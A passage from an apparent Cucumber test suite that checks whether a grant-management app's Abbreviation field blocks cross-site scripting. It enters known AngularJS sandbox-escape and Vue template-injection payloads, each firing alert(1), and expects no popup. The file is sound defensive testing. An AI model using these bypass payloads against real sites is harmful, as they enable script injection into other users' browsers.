      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301506 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                 | Field                |
      | <teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301510 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <component is=script text=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301513 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | {{constructor.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301514 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | {{$on.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301515 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                      | Field                |
      | {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301517 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | {{{}.")));alert(1)//"}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301531 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301534 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301539 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | {{{}.")));alert(1)//"}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301548 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                     | Field                |
      | {{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) && (apply = constructor) && (valueOf = call) &&  (''+''.toString('F = Function.prototype;' +'F.apply = F.a;' +'delete F.a;' +'delete F.valueOf;' +'alert(1);' )));}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301550 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                            | Field                |
      | {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301552 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                  | Field                |
      | {{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301554 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                             | Field                |
      | {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301555 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                      | Field                |
      | {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301557 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301559 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script2} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301563 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                                                                  | Field                |
